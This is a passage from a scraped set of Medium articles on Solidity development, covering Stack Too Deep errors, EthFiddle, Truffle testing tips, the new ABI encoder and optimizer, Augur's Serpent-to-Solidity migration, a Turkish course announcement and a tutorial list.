argument to the function. So, I ran over these lines with the Remix debugger and observed that they do load each successive argument onto the stack (I\u2019m not worried with how exactly those 9 opcodes copy these data). These are followed by 3 POP instructions that clear the part of the stack we no longer need (which was used to calculate the position in the call data of the next argument to be read). At this point, the top of the stack holds the 16th argument, the second element holds the 15th argument and so on. The 16th element of the stack is, at this stage, the first argument. This is followed by the return address of the function (0x109) and the function selector.The code then pushes into the stack the 32 byte identifier of topic 0 fcf771399d75a67a6d0e730ae98d34c40b6bfe6ebf8053b98ddf4da8c2706250, which pushes the first input out of the top 16 elements of the stack, and follows this with the DUP opcode that puts at the top of the stack the argument for the log event (eg a2 or a16).The next 20 lines or so prepare the memory to hold the argument of the log event at memory position 0x80, and guarantee the stack has in its top two positions this address and the length of the data (0x20). Then, it calls the opcode LOG1, which emits a log event with one single argument and one topic, using the data at the top 3 positions in the stack:0: 0x00000000000000000000000000000000000000000000000000000000000000801: 0x00000000000000000000000000000000000000000000000000000000000000202: 0xfcf771399d75a67a6d0e730ae98d34c40b6bfe6ebf8053b98ddf4da8c2706250There are in total five LOGn opcodes, LOG0 to LOG4, where n indicates the number of topics in the log. Topic0 is always the identifier of the event type, defined by the hash of its signature, but it can be skipped by using LOG0, which specifies an anonymous event. Each additional topic requires another slot in the stack, pushing that many more arguments out of the reachable list.This analysis shows that an event with one argument prevents one variable of being used, because topic0 is placed in the stack before the event data. This raises a couple of questions:What if we have more topics? Are they placed in the stack before the data as well?And what is the impact of more event arguments, are they PUSHed after or before the topic?To test that, I\u2019ll change the contract again. Notice that events can have any number of arguments, and up to 3 of them can be indexed. Indexed arguments become topics, while the others are lumped in the data section. My hypothesis, at this stage, is that each topic (indexed argument) will be placed in the stack before the data, and so will prevent the access to more of the early variables.In my tests, I covered several scenarios, but they all lead to the same conclusion so I will save you the minute details. I will just illustrate with another interesting and counter-intuitive case, and then draw final conclusions.First, let\u2019s try this version of the contract, where the event has one indexed value and two non-indexed ones.pragma solidity ^0.4.24;contract TestStackError {  event LogValue(uint indexed a1, uint a2, uint a3);  function logArg(uint a1, uint a2, uint a3, uint a4,\tuint a5, uint a6, uint a7, uint a8,\tuint a9, uint a10, uint a11, uint a12,\tuint a13, uint a14, uint a15, uint a16  ) public {    emit LogValue(a2, a3, a4);  }}The bytecode for this function (after the function dispatch) until the event is emitted is this:265 JUMPDEST266 DUP15267 PUSH32 a5397a5faa0ec7cfb89428503b91a13bbd737592f7561e6773fa3e1458c8735c300 DUP16301 DUP16302 PUSH1 40304 MLOAD305 DUP1306 DUP4307 DUP2308 MSTORE309 PUSH1 20311 ADD312 DUP3313 DUP2314 MSTORE315 PUSH1 20317 ADD318 SWAP3319 POP320 POP321 POP322 PUSH1 40324 MLOAD325 DUP1326 SWAP2327 SUB328 SWAP1329 LOG2The opcode that emits the event is LOG2. This means we have two topics, one the default topic0 (ie the event signature) and the other the only indexed argument in the event signature. The remaining two values are grouped in memory.If we check Ethervm for this opcode, we see that the last value read from stack, and the first to be pushed onto it, is topic1, that is, the indexed argument \u2014 a2. Initially, this is placed at position 15 of the stack. The opcode DUP15 places a copy of the value at the top of the stack, and consequently pushes all the other arguments down. From now on, for example, a2 is in position 16, and a1 is in position 17.The next instruction pushes a 32-bit value to the stack, that simply corresponds to topic 0. This value is hardcoded. This also has the effect of pushing again the arguments down. Now, a2 is in position 17.The following instructions are two DUP16 opcodes. The first one copies the value at position 16, which is currently the third argument, a3. But since this pushes a new element onto the stack, when the next opcode is called DUP16 will copy the fourth argument to the function, a4. At this stage, at the top of the stack we have the data for the event (two words), the indexed argument and the event unique identifier.The following lines copy the first two values to memory:(302\u2013305): places the contents of memory 0x40 at the top of the stack, twice. This is the position in memory where the event data will be located (and is 0x80 in my execution).(306\u2013308): places the first data word at the first free position in memory (ie places a3 in position 0x80)(309\u2013311):places the next free position in memory at the top of the stack(312\u2013314): places the second data word at the next free position in memory (ie places a4in position 0xa0)(315\u2013321): calculates the next free position in memory and leaves it at the top of the stack, after eliminating values that are no longer needed.(322\u2013327): finds the length of the data submitted to the event, by subtracting the initial address of next free position in memory from the current value of that position (held at the top of the stack).(328): reorders the first two elements of the stack, making the first element the beginning of the event data, and the second address the length of this data.(329): finally calls the logging opcode.I gave this detailed explanation so that you can understand how this process works, if you wish. In that case, perhaps you can now explain the next apparent oddity. Change only the signature of the event to:event LogValue(uint a1, uint indexed a2, uint a3);Yep, another Stack Too Deep error. Can you see what is causing it?\u2026\u2026\u2026\u2026\u2026\u2026The bytecode does not change much. We still have the same number of topics, so the opcode at the end will still be LOG2. And it still expects to receive its arguments in the same order, that is, the topics first, then the data.Now, the second topic must be loaded first, so a3 would be the first value to be pushed to the stack with a DUP14. Then topic0 would be pushed. Now, the EVM would place at the top of the stack the two arguments it needs to store in memory, a2 and a4. These were originally at positions 15 and 13. However, the EVM has made two pushes already, which makes these positions 17 and 15. It is impossible to place the first value in the stack (DUP17 does not exist) and so the compilation errors.So now that we understand this, I try changing just one more thing, the log function to:emit LogValue(a3, a2, a4);This code works, since it corresponds very closely to the last block before I changed the order of the indexed arguments. In that code, the indexed value of the event was called with a2. In this version, it is still a2 that is passed to that position, and the others remain the same. The bytecode explanation is virtually the same.ConclusionThis has been a long post. If you have arrived this far, it is worth leaving you with an organised view of what is happening, so that you can go back to your programs and think if your \u201cStack Too Deep\u201d errors could have been caused by a similar behaviour. Although this post covers only the case of emitting events, other functions will use other opcodes, but will still have the same logic, in copying the function arguments (or intermediate values) to the stack when some computation is needed.So here are some streamlined notes to keep in mind:When a function is called, a stack frame is created. This includes, from bottom to top:the function selectorthe return addressthe leftmost value-type argument of the function\u2026the rightmost value-type argument of the function\u201cStack Too Deep\u201d errors depend on the central opcode of an action (eg arithmetic, hashing, calling another function, emitting events, etc.)If these central operations are performed on pure function arguments, the order in which they are passed to the function may decide the occurrence of a \u201cStack Too Deep\u201d error. (Stack slots can also be used for intermediate calculations and local variables, but I intend to study those in a later post.)It is crucial to know the number and order of the arguments for the opcode. These arguments are typically read from the stack (the only exception is the PUSH opcode).Opcode arguments have to be pushed to the stack before executing the opcode. Each PUSH moves the function arguments down at least one slot. The function arguments deeper in the stack are the ones that were processed first, that is, the leftmost ones in the function signature.If some of the function arguments are not used in that opcode operation, then they should come first in the function signature, to reduce the chances that opcode arguments will be off-reach when they need to be stacked.Opcodes use arguments at different levels in the stack. Deeper levels are pushed first. If an argument is pushed after another, it should appear in the function signature after the former as well, otherwise it would push the other one down the stack before it could be used. Example:Consider an event with two indexed arguments t1 and t2 in this order, that is called inside a function with several arguments, among which a1 coming before a2If the event is emitted with t1 = a1 and t2 = a2, the opcode LOG3 will be called.Before calling this opcode, t2 = a2 will be pushed first into the stack.This will push a1 down and put it at risk of being unreachable when the time comes to push the value of t1 = a1.This would be avoided if a1 came after a2 in the function signature, since it would be higher in the stack than a2. Assuming a2 was reachable when it was pushed, so would be a1 afterwards.The above post concentrated on LOGn opcodes only, in particular on versions requiring 3 or 4 arguments in the stack. A more difficult case will be calling functions in other contracts or libraries, since the opcodes CALL and DELEGATECALL take 7 or 6 input arguments each, with a lot more possibilities of interaction between the opcode and function arguments.I hope this gives you some clues on how to debug and handle \u201cStack Too Deep\u201d errors. There is a lot more to say, but that will have to wait for other opportunities.Until next time.Alexandre Pinto \u2014 Blockchain developer at Artos (Aventus Ecosystem Party)Alex is a software engineer at Artos, our ecosystem partner, working on the blockchain engineering team. He has 20 years of experience working in technology, completing a PhD in Computer Science as well as a post-doctorate in Cryptography. As part of his research, Alex has published papers on Kolmogorov Complexity, Cryptography, Database Anonymization and Code Obfuscation.Pinto also spent seven years lecturing at the University Institute of Maia, including directing the degree programmes for BSc Computer Science and Information Systems and Software.This article was originally posted on his blog.Since you are here, we would love if you connected with us on Telegram,Reddit, Twitter, Facebook, Youtube, Instagram and LinkedIn.Also, we have started a LinkedIn Group for ticketing developers/other developers to engage, join us and start a conversation.", "responses": 0, "tags": ["Ethereum", "Solidity", "Programming", "Blockchain", "Stack"]}, {"title": "EthFiddle.com: Share Your Solidity Code Snippets in Seconds", "post_link": "https://medium.com/loom-network/ethfiddle-com-share-your-solidity-code-snippets-in-seconds-1a006e09eaad?source=search_post", "author_name": "James Martin Duffy", "author_link": "https://medium.com/@jamesmartinduffy", "publish_date": "2017-11-15", "last_modified_date": "2019-08-19", "readtime": "1.36", "claps": 386, "voters": 40, "content": "EthFiddle.com: Share Your Solidity Code Snippets in SecondsJames Martin DuffyFollowNov 15, 2017 \u00b7 2 min readFor developers getting started in Solidity, you\u2019ll find the ecosystem doesn\u2019t yet have all the tools and services we\u2019ve grown accustomed to using with other programming languages.Here at Loom Network, we found ourselves wishing we had something like Go Playground or JSFiddle for Solidity \u2014 some way to quickly share our code snippets with each other on Slack, or with others on sites like StackOverflow. So we decided to build one.Announcing EthFiddle.com: Share your Solidity code snippets in seconds.Easily compile, debug, and share your smart contracts in the browser.EthFiddle lets you compile your Solidity code directly in the browser, so you can quickly test & debug smart contract code, and share a permalink to your code in a click.Feel free to use it, share it, and give us feedback to let us know what you think!We\u2019ll be adding some features over the coming weeks, as well as releasing a couple other tools that will make it easier for developers to learn, build, and deploy Solidity DApps.Update: Did you know? We publicly released the Loom SDK beta in June, 2018. See the announcement here.Loom Network is the blockchain platform of choice for serious dapp developers \u2014 the Universal Layer 2 that provides developers the tools they need to build functional user-facing dapps today.New to Loom? Start here.Want to stake your LOOM tokens and help secure Loom Network? Find out how.And if you enjoyed this article and want to stay in the loop, go ahead and sign up for our private mailing list.", "responses": 3, "tags": ["Ethereum", "Solidity", "Cryptocurrency", "Blockchain", "Development"]}, {"title": "Tips for Writing Solidity Tests with Truffle", "post_link": "https://medium.com/@mattdlockyer/tips-for-writing-solidity-tests-with-truffle-45cd278724b3?source=search_post", "author_name": "Matt Lockyer", "author_link": "https://medium.com/@mattdlockyer", "publish_date": "2017-08-31", "last_modified_date": "2018-05-24", "readtime": "3.83", "claps": 140, "voters": 39, "content": "Tips for Writing Solidity Tests with TruffleMatt LockyerFollowAug 31, 2017 \u00b7 4 min readDCTRL VancouverAt first glance the Truffle Framework seems to be all setup for writing, deploying and testing contracts, and it\u2019s very well done. There are however some instances where you may want to augment Truffle with a few tips in order to streamline your test writing and running.I\u2019ll talk about 3 specific tips:Using `async` and `await` vs. promisesCreating a shared context for multiple testsEmbedding tests in other testsUsing these tips should help reduce a significant amount of code duplication in your tests and allow you to write more readable tests.Using `async` and `await` vs. promisesTruffle comes with some tests out of the box and each test involves a lot of repeated boilerplate (which we\u2019ll talk about in 2) and uses promises.it(\"should call a function that depends on a linked library\", function() {    var meta;    var metaCoinBalance;    var metaCoinEthBalance;return MetaCoin.deployed().then(function(instance) {      meta = instance;      return meta.getBalance.call(accounts[0]);    }).then(function(outCoinBalance) {      metaCoinBalance = outCoinBalance.toNumber();      return meta.getBalanceInEth.call(accounts[0]);    }).then(function(outCoinBalanceEth) {      metaCoinEthBalance = outCoinBalanceEth.toNumber();    }).then(function() {      assert.equal(metaCoinEthBalance, 2 * metaCoinBalance,\"Library function returned unexpected function, linkage may be broken\");    });  });A bulk of the test is basic Promise \u201ccruft\u201d. Let\u2019s see what that test looks like rewritten with async and await.it(\"should call a function that depends on a linked library\", async function() {    var meta = await MetaCoin.deployed();    var metaCoinBalance = (await meta.getBalance.call(accounts[0])).toNumber();    var metaCoinEthBalance = (await meta.getBalanceInEth.call(accounts[0])).toNumber();assert.equal(metaCoinEthBalance, 2 * metaCoinBalance,\"Library function returned unexpected function, linkage may be broken\");  });Wow, what a difference!You can see that the savings comes from turning the test function itself into an async function and then having it await for each of the values it needs. Therefore, we don\u2019t need to write functions to handle each promise returned by the Truffle Contract instance meta of our contract MetaCoin.The other savings comes from being able to wrap the await response in brackets and convert directly from the object of type BigNumber into a JavaScript number using:(await meta.getBalance.call(accounts[0])).toNumber();Every uint256 returned from Solidity to JavaScript is an object of type BigNumber and can be converted to a number or string.Creating a shared context for multiple testsAnother useful trick is creating a shared context of variables that you would like to use in multiple tests, across multiple contracts.The way Truffle is initially setup doesn\u2019t make this immediately obvious, and it took some Mocha digging to find the right approach.Here\u2019s how Truffle sets up a test out of the box:contract('MetaCoin', function(accounts) { ... tests ... }Now if you wanted to require this test in another test, it would be difficult. And how would you pass the same basket of variables (context) created inside this test to other tests, i.e. the \u201cshared context\u201d you\u2019re trying to achieve.Here\u2019s a slight modification on running a test that has an export, returns a context JSON object, all placed in a new file called shared.js:const run = exports.run = async(accounts) => {  const meta = await MetaCoin.deployed();  it(\"should have MetaCoin deployed\", () => {    assert(meta !== undefined, \"MetaCoin is deployed\");  });  return { meta }};contract('Shared', run);Now we have a nice test function that is async and returns a context object with our contract instance. It will await the deployed instance of our Truffle Contract and we can return the instance to be used inside our other contracts like so:const shared = require('./shared.js');contract('MetaCoinSale', (accounts) => {  let meta; //explained in a moment  it(\"should have the shared context\", async() => {    context = await shared.run(accounts);    meta = context.meta;    //or...    ({ meta, ... } = context);    //make sure not undefined    assert(meta !== undefined, 'has MetaCoin instance');  });... tests can use MetaCoin instance now ...});And there we have it. The first test in your actual contract test script will wait for the shared context to be returned, because we made the entire test runner function async.//shared.jsconst run = exports.run = async(accounts) => { ... }You can also declare several other variables in shared.js and return them using the context object. In your contract tests, simply use assignment (or destructuring to keep the lines of code minimal) for variables. Also to keep things convenient, I keep context variables scoped to the main test runner function so that all tests can access them. You\u2019re off to the races in minimizing your test code.Why declare variables like meta for the MetaCoin contract instance outside all your tests like this? It greatly simplifies each test you write, otherwise you would have to call:const meta = await MetaCoin.deployed();From inside each test case. Some might not like this, but the approach has been working out fine for me so far.Embedding tests in other testsThis is essentially the same modification of decoupling the test runner function from the truffle contract call as in shared.js. For MetaCoin it looks something like this:const run = exports.run = (accounts) => {  ... MetaCoin tests ...};contract('MetaCoin', run);You would then use this in another contract like so:const metaTests = require('./metacoin.js');contract('MetaCoinSale', (accounts) => {  ...  metaTests.run(accounts);  ...});Note that an actual contract test runner is NOT async:const run = exports.run = (accounts) => {It will derail your whole shabang if it was\u2026 I\u2019m getting a bit tired writing this post but give it a shot making it async and watch it break :)All your test can still be async like this though:const run = exports.run = (accounts) => {  it(\"should do some async magic\", async() => { ... }};contract('MetaCoin', run);And that\u2019s it! Those are my tips. Go forth, write small tiny tests and make some great, secure smart contracts.", "responses": 1, "tags": ["JavaScript", "Solidity", "Blockchain", "Ethereum", "Testing"]}, {"title": "The new Solidity ABI Encoder/Decoder and Optimizer", "post_link": "https://medium.com/@chriseth/the-new-solidity-abi-encoder-decoder-and-optimizer-aee8f91e2455?source=search_post", "author_name": "Christian", "author_link": "https://medium.com/@chriseth", "publish_date": "2017-12-01", "last_modified_date": "2018-05-17", "readtime": "4.78", "claps": 309, "voters": 38, "content": "The new Solidity ABI Encoder/Decoder and OptimizerChristianFollowDec 1, 2017 \u00b7 5 min readOriginal / updating version of this text: https://github.com/chriseth/notes/blob/gh-pages/articles/abi_iulia/abi_iulia.mdMotivationThe release notes of some of the previous Solidity releases kept on mentioning the new ABI encoder, which will enable you to use structs and arbitrarily nested arrays in function arguments and return values. Still, when people ask whether it can be finally used now, I have to politely decline and say it is not yet finished. The main reason why it takes a little longer is that we re-implemented it from scratch in a new programming language. In the following, I would like to explain the benefits of doing that and what the current progress is.The previous ABI encoder component of the Solidity compiler generated EVM assembly directly. This has several drawbacks: It is quite easy to introduce errors, it is very hard to check that it works correctly, it is difficult to maintain and finally, it is not so easy to write an optimizing compiler for this part.The following code is taken from the old ABI decoder:// first load from calldata and potentially convert to memory if arrayType is memoryTypePointer calldataType = arrayType.copyForLocation(DataLocation::CallData, false);if (calldataType->isDynamicallySized()){    // put on stack: data_pointer length    CompilerUtils(m_context).loadFromMemoryDynamic(IntegerType(256), !_fromMemory);    // stack: base_offset data_offset next_pointer    m_context << Instruction::SWAP1 << Instruction::DUP3 << Instruction::ADD;    // stack: base_offset next_pointer data_pointer    // retrieve length    CompilerUtils(m_context).loadFromMemoryDynamic(IntegerType(256), !_fromMemory, true);    // stack: base_offset next_pointer length data_pointer    m_context << Instruction::SWAP2;    // stack: base_offset data_pointer length next_pointer}else{    // leave the pointer on the stack    m_context << Instruction::DUP1;    m_context << u256(calldataType->calldataEncodedSize()) << Instruction::ADD;}Since the EVM is a stack machine, you always have to keep track where the various values are stored when you write EVM assembly directly and because of that, there is a comment about the current stack layout in every second line. If you want to introduce a new variable, you have to go through the whole code and update it.The new ABI Encoder/DecoderIn contrast, this is a snippet of the code generating the new ABI encoder (and you will see why I say \"generating the ABI encoder\" instead of \"of the ABI encoder\" in a moment):function <functionName>(offset, end) -> array {    if iszero(slt(add(offset, 0x1f), end)) { revert(0, 0) }    let length := <retrieveLength>    array := <allocate>(<allocationSize>(length))    let dst := array    <storeLength> // might update offset and dst    let src := offset    <staticBoundsCheck>    for { let i := 0 } lt(i, length) { i := add(i, 1) }    {        let elementPos := <retrieveElementPos>        mstore(dst, <decodingFun>(elementPos, end))        dst := add(dst, 0x20)        src := add(src, <baseEncodedSize>)    }}The code above is responsible for decoding any kind of array type and at the same time, it performs bounds checks and cleanup on the decoded elements, which the old decoder did not do. It is written in our new intermediate language called iulia and is actually just a template. The various strings in angle brackets like <retrieveLength> will be replaced depending on the concrete array type we want to decode.Furthermore, the various small tasks like allocating memory, retrieving and storing the length of an array, cleanup of value types and so on, will be done in separate functions which are templates themselves. This makes the design very flexible and modular and most importantly easy to audit.The OptimizerThis modularity also has a drawback, which you will see if you take a look at the following code, which is the iulia code of the decoder for function f(uint, uint, uint) public {} with all templates expanded.function abi_decode_tuple_t_uint256t_uint256t_uint256(headStart, dataEnd) -> value0, value1, value2{    switch slt(sub(dataEnd, headStart), 96)    case 1 {        revert(0, 0)    }    {        let offset := 0        value0 := abi_decode_t_uint256(add(headStart, offset), dataEnd)    }    {        let offset := 32        value1 := abi_decode_t_uint256(add(headStart, offset), dataEnd)    }    {        let offset := 64        value2 := abi_decode_t_uint256(add(headStart, offset), dataEnd)    }}function abi_decode_t_uint256(offset, end) -> value{    value := cleanup_revert_t_uint256(calldataload(offset))}function cleanup_revert_t_uint256(value) -> cleaned{    cleaned := value}Wait, why is there so much code? A human writing this manually would just use the much shorter functionfunction abi_decode_tuple_t_uint256t_uint256t_uint256(headStart, dataEnd) -> value0, value1, value2{    if iszero(slt(sub(dataEnd, headStart), 0x60)) { revert(0, 0) }    value0 := calldataload(0)    value1 := calldataload(0x20)    value2 := calldataload(0x40)}It actually turns out that these two snippts of code are semantically equivalent. The many functions above are generated because of the modularity of the decoder and it would be really bad for the gas costs of the contract if this would be the final code the contract is compiled to.Luckily, compilers have a stage called the \"optimizer\", which takes code (usually written in the intermediate language) and transforms it into shorter or faster code that has exactly the same behaviour. We are currently working on the optimizer for iulia, especially the \"inlining expansion\" component. Such a component looks for function calls satisfying a certain criterion (for example that they call a function which is very short) and replace the function call by the code of the function itself. The function cleanup_revert_t_uint256 above is especially suitable for inlining because it does exactly nothing. For integer types shorter than 256 bytes, the decoder has to clean the value, but there is not nothing to be done for full 256 bit integers. Also abi_decode_t_uint256 should be inlined, since it only contains a single instruction after cleanup_revert_t_uint256 has been inlined. The code would look as follows after the function inlining step and removal of unused functions:function abi_decode_tuple_t_uint256t_uint256t_uint256(headStart, dataEnd) -> value0, value1, value2{    switch slt(sub(dataEnd, headStart), 96)    case 1 {        revert(0, 0)    }    {        let offset := 0        value0 := calldataload(offset)    }    {        let offset := 32        value1 := calldataload(offset)    }    {        let offset := 64        value2 := calldataload(offset)    }}This is already almost where we want to go. We only need to do one additional step we call \"variable elimination\" or \"rematerialization\". It will replace a referenced variable by the expression that is currently assigned to it. This is especially useful if the variable is used only once or its value is a constant. After this step, we have the following code:function abi_decode_tuple_t_uint256t_uint256t_uint256(headStart, dataEnd) -> value0, value1, value2{    switch slt(sub(dataEnd, headStart), 96)    case 1 {        revert(0, 0)    }    {        value0 := calldataload(0)    }    {        value1 := calldataload(32)    }    {        value2 := calldataload(64)    }}Apart from the extra blocks and the switch instead of the if, this is the same code as the one written manually above.ConclusionAs you have hopefully seen from this small example, it is possible to follow what the new optimizer does and whether it does everything correctly. Because the code still contains loops, functions, variables and expressions, everything stays more or less readable. Furthermore, the expressions keep the code well suited for stack-based machines like the EVM or WebAssembly machine.The previous EVM assembly based optimizer had a symbolic execution stage where it would build up its own impression of the code in memory and then re-generated the code from scratch in an optimized way. You can probably imagine that in this old optimizer, bugs were extremly hard to fix, especially when compared to the new optimizer. Because of that, we just turned off all of the stages of the old optimizer we were not confident in anymore.Of course the long-term goal is to use iulia in all parts of the compiler and not just the ABI encoder/decoder, but that part is a fairly isolated but yet complicated enough aspect of the Solidity compiler so that it makes to try it out there.", "responses": 0, "tags": ["Programming", "Compilers", "Ethereum", "Blockchain", "Solidity"]}, {"title": "Solidity Migration & What\u2019s Next", "post_link": "https://medium.com/@AugurProject/solidity-migration-whats-next-3760d3e2936b?source=search_post", "author_name": "Augur", "author_link": "https://medium.com/@AugurProject", "publish_date": "2017-09-19", "last_modified_date": "2018-05-01", "readtime": "2.26", "claps": 146, "voters": 36, "content": "Solidity Migration & What\u2019s NextAugurFollowSep 19, 2017 \u00b7 3 min readSix weeks ago Augur and ZeppelinSolutions disclosed an audit of the Serpent compiler, revealing a critical security vulnerability effecting the Reputation (REP) token. After a few weeks of preparation, the REP token contract was migrated to Solidity in a few hours, and we began a sprint to migrate the rest of our codebase to Solidity. The strongest recommendation from the Zeppelin security audit was to switch to Solidity and deprecate Serpent.We\u2019re pleased to share that in the planned six week time frame, we have completed the migration from Serpent to Solidity. There is no longer any remaining legacy Serpent code in the augur-core contracts.We believe Solidity is a better foundation to build Augur off of in comparison to Serpent. One of our contract engineers, Micah, shared his opinion on Reddit the other day:In my opinion, Solidity is a much more mature language. The tooling is better, it has a real type system, and its static analyzer catches a lot more than Serpent\u2019s analyzer. It also is the language most other projects are using which means we now have a larger support network and it is easier to find answers to questions. The documentation for Solidity is also significantly better, so it requires less \u201cpoke it to figure out how it works\u201d than Serpent.That being said, there are a few annoyances that have bitten us, such as the Stack Too Deep issue.Overall, I\u2019m very happy for the migration and I believe that it will be a net positive for development velocity in the long run, as well as a net positive for security.-@MicahZoltuWhat\u2019s Next?Does this mean we\u2019re ready to launch? Unfortunately, no. There are still tasks to be completed within the contracts before they\u2019re ready for auditing.Contracts:Contracts need fee payout implemented, the REP price feed oracle built, and a number of additional pieces of information tracked for the dynamic fee system to work properly.Contracts need all FIXMEs and TODOs completed / addressed.Reporting escape hatch needs to be authored (a short-term emergency lever for if a major bug is found during early phases of launch).Contracts need much more testing of sad paths, and more thorough testing of happy paths.Contracts need to be internally audited.Contracts need to be externally audited.Contract deployment pipeline / scripts need to be authored.Augur Node needs to be designed and written (details about this to come).Client:Finish re-skinning: portfolio, create market, and authentication views (in progress).Re-skin the market and reporting views.Package different distributions of Augur (downloadable client, IPFS, dApp browsers).Scale and harden IPFS deployment.Testing, user feedback, UX walkthroughs, improvements, etc.The new client is about 50% complete. Our speed of development has improved since the migration. The engineering team has been growing rapidly, and we\u2019re finding employees easier to onboard at this time in the project.We have a rough timeline scoped out internally for everything necessary to bring us to launch. Over the coming weeks, we will share some of these broken down timelines with you, as well as updating you with our weekly development updates.If you have any questions, please reach out to us on Twitter or Slack.Cheers,The Augur Team", "responses": 1, "tags": ["Ethereum", "Bitcoin", "Augur", "Blockchain", "Prediction Markets"]}, {"title": "Solidity ve Ethereum E\u011fitimi Hakk\u0131nda", "post_link": "https://medium.com/codefiction/solidity-ve-ethereum-e%C4%9Fitimi-hakk%C4%B1nda-977e92defbf4?source=search_post", "author_name": "Mert Susur", "author_link": "https://medium.com/@mertsusur", "publish_date": "2017-11-01", "last_modified_date": "2018-05-30", "readtime": "1.05", "claps": 171, "voters": 36, "content": "Solidity ve Ethereum E\u011fitimi Hakk\u0131ndaMert SusurFollowNov 1, 2017 \u00b7 2 min read2 g\u00fcn s\u00fcrecek olan ve online olarak ger\u00e7ekle\u015fecek Ethereum ve Solidity e\u011fitimi hakk\u0131nda bilgi almak i\u00e7in t\u0131klay\u0131n.Biliyorum biliyorum, son yaz\u0131mdan bu yana epey oldu ve arada bir de Ethereum bulu\u015fmas\u0131 ge\u00e7ti ve hakk\u0131nda rapor bile yazamad\u0131m. Ama merak etmeyin tembellik yapm\u0131yorum. Hatta Onur\u2019un da \u0130stanbul\u2019a d\u00f6nmesiyle daha da fazla \u00e7al\u0131\u015f\u0131yoruz diyebilirim.Neyse geyik yapmay\u0131 b\u0131rak\u0131p konuya bu yaz\u0131n\u0131n amac\u0131na geri d\u00f6nelim. Onur ile birlikte \u00fcniversite ve lise \u00f6\u011frencilerine \u00f6zel bir e\u011fitim haz\u0131rlad\u0131k. E\u011fitimi \u00fccretsiz bir \u015fekilde \u00f6\u011frencilere ve Patreon destek\u00e7ilerine sa\u011flayaca\u011f\u0131z. Yakla\u015f\u0131k \u00fc\u00e7 saat s\u00fcrecek online e\u011fitimde Ethereum\u2019dan, EVM\u2019den ve Solidity\u2019den bahsedece\u011fiz. G\u00fcn\u00fcn sonunda ise hedefimiz kat\u0131l\u0131mc\u0131lar\u0131n ak\u0131ll\u0131 kontrat yazabilmesini sa\u011flamak.Peki neden yap\u0131yoruz bunu?Cevap asl\u0131nda \u00e7ok basit, T\u00fcrkiye\u2019de teknolojinin ilerlemesini ve bu konuda olabildi\u011fimiz kadar destek olmak istiyoruz. Ancak bu e\u011fitime de sadece bu i\u015fe hevesli ve merakl\u0131 \u00f6\u011frencilerin kat\u0131lmas\u0131n\u0131 istiyoruz. Kimse al\u0131nmas\u0131n ama para kazanmak i\u00e7in yat\u0131r\u0131m tavsiyesi isteyenlerden yorulduk. Bu e\u011fitimde de bu konuda asla ve asla konu\u015fmayaca\u011f\u0131z.Nas\u0131l kat\u0131l\u0131r\u0131m?E\u011fitim i\u00e7in a\u00e7t\u0131\u011f\u0131m\u0131z sitemize girerek kayd\u0131n\u0131z\u0131 nas\u0131l yapaca\u011f\u0131n\u0131z hakk\u0131nda yeterli bilgiye eri\u015febilirsiniz.Nas\u0131l \u00e7al\u0131\u015f\u0131yor \u015fu ak\u0131ll\u0131 kontrat?Bunu incelemek i\u00e7in iki opsiyonunuz var, ya Rinkeby \u00fczerindeki 0xaef70b0d7da2654b0f73285854d0e694b6a7d8bd adresli ak\u0131ll\u0131 kontrat\u0131m\u0131za g\u00f6z atabilir ya da github \u00fczerindeki repository\u2019mize g\u00f6zatabilirsiniz.Ba\u015fka neler var?Ba\u015fka \u015feyler tabi ki var! Hi\u00e7 olmaz m\u0131? \u00d6rne\u011fin Garanti Partners\u2019daki Blockchain ve Ethereum seminerinin videolar\u0131 youtube/codefiction kanal\u0131nda yay\u0131nland\u0131 mesela. \u0130zlemek i\u00e7in f\u0131rsat\u0131n\u0131z oldu mu?", "responses": 0, "tags": ["Ethereum", "Solidity"]}, {"title": "Top Solidity Tutorials", "post_link": "https://medium.com/coinmonks/top-solidity-tutorials-4e7adcacced8?source=search_post", "author_name": "Gaurav Agrawal", "author_link": "https://medium.com/@gaurav.agrawal", "publish_date": "2018-05-18", "last_modified_date": "2019-06-08", "readtime": "2.75", "claps": 241, "voters": 32, "content": "Top Solidity TutorialsSolidity tutorials and stories from writers on Coinmonks, Learn & build dapps on ethereumGaurav AgrawalFollowMay 18, 2018 \u00b7 3 min readsourceCreate Crypto Invoices and get Paid in CryptoCryptofi \u2014 Create Crypto Invoices and get paid in crypto,Donate to CoinmonksFind crypto jobs using Coinmonks jobs portalClick to find blockchain JobsCheck latest Solidity StoriesSolidity Development: Setting up environmentSolidity Development: Setting up environmentSetting up working environment for smart contract developmentmedium.comSolidity Development: Creating our first smart contractSolidity Development: Creating our first smart contractDeveloping smart contract for crypto gamemedium.com#HowToBUIDL Series (1 of n)#HowToBUIDL Series (1 of n)#BUIDL :: Dev Environment Setup. This series is written for anyone searching for a way to break free. There\u2019s no reason\u2026medium.comA Gentle Introduction to Building a Full Stack DApp on Ethereum \u2014 Part 1A Gentle Introduction to Building a Full Stack DApp on Ethereum \u2014 Part 1In this tutorial, we\u2019ll build a simple dapp (decentralized application). The goal is to introduce all the pieces of the\u2026medium.comHow To: Compile a Solidity Smart Contract Using Node.jsHow To: Compile a Solidity Smart Contract Using Node.jsIn the previous blog post, we wrote a smart contract using the Solidity programming language.medium.comHow To: Write a Simple Smart ContractHow To: Write a Simple Smart ContractWe\u2019re going to write a simple smart contract using the Solidity programming language, and in the following posts we\u2019ll\u2026medium.comGetting started with Solidity development using TruffleGetting started with Solidity development using TrufflePresented by Yorke Rhodes January 31, 2017medium.comTesting Solidity with Truffle and Async/AwaitTesting Solidity with Truffle and Async/AwaitIf you were to ask a programmer/developer what the worst part of the job is, I think most would say writing tests. You\u2026medium.comLearn Solidity. Shark of The Pool \u2014 Part 1Learn Solidity. Shark of The Pool \u2014 Part 1In this series we will create a simple Dapp, based on Ethereum blockchain using Solidity smart contracts. In the later\u2026medium.comLinked Lists in SolidityLinked Lists in SolidityWe need an efficient structure to store a large number of entries in a smart contract that we can quickly traverse. It\u2026medium.comStorage vs Memory in SolidityStorage vs Memory in SolidityA simple example to make you thinkmedium.comReturn values in solidity contractsReturn values in solidity contractsIf the only other option is to revert, no point returning a boolmedium.comTaming the DApp with eventsTaming the DApp with eventsManaging state is tough. Managing UI complexity is tough. Managing state in your app, on the Ethereum blockchain and\u2026medium.comEthereum Contract InheritanceEthereum Contract InheritanceThis is an excerpt from the Concurrence Exploration of Contract Inheritance.medium.comTest A Smart Contract With TruffleTest A Smart Contract With TruffleIn the previous article, I showed you how to write the smart contract in the Remix editor. But it\u2019s not convenient to\u2026medium.comSolidity: Transaction-Ordering AttacksSolidity: Transaction-Ordering AttacksThis article will explain an attack vector in Ethereum Smart 